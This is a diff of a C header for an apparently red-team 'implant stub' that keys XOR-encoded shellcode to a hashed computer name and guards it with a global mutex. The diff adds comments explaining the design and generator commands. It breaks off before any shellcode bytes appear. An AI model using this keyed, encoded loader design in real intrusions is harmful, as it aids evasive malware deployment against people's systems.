@@ -1,12 +1,36 @@
-#define WITH_MUTEX_CHECK
+// ------------------------------------------------------------------------------
+//
+//  Implant Stub Code - C (Visual Studio) Executable
+//  (C) 2016 Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
+//  MWR InfoSecurity Ltd, MWR Labs
+//
+//  This code is designed to act as a wrapper for existing implants during simulated
+//  attacks.
+//
+//  Compile this using Visual Studio 2013.
+//
+//  This file stores the name of the mutex (which allows the implant stub to tell
+//  whether it is already running), a hash of the computer name and the raw shellcode
+//  to execute.
+//
+// ------------------------------------------------------------------------------
+
+// The mutex name. Just pick something unique.
+// Prefixing it with Global\\ makes it unique on the system (i.e. all users).
+// Prefixing it with Local\\ makes it unique to the session (i.e. that user).
 #define MUTEX_NAME TEXT("Global\\Stufus")
+
+// This will always be 20 (byte length of an SHA-1 hash)
 #define HASH_LEN 20
 
 // This is the hash of: TESTER
+// You can generate this with raw2src.py. e.g. ./raw2src.py -c STUFUS -o C
 BYTE hashSHA1ComputerName[] = 
 "\x53\x8f\x68\xf9\x2c\xa3\x76\xe5\x23\xe6\xd6\xa9\x68\x63\xde\x02\x7d\x76\xa3\xda";
 #define hashSHA1ComputerNamelen 20
 
+// This is the encoded shellcode
+// You can generate this with raw2src.py. e.g. ./raw2src.py -s shellcode.raw -x "MWRINFOSECURITY.COM" -o C 
 // Shellcode loaded from: ../shellcode-implant-stub/shellcode.raw
 // Shellcode XOR'd with hash of: TESTER
 BYTE shellcode[] =
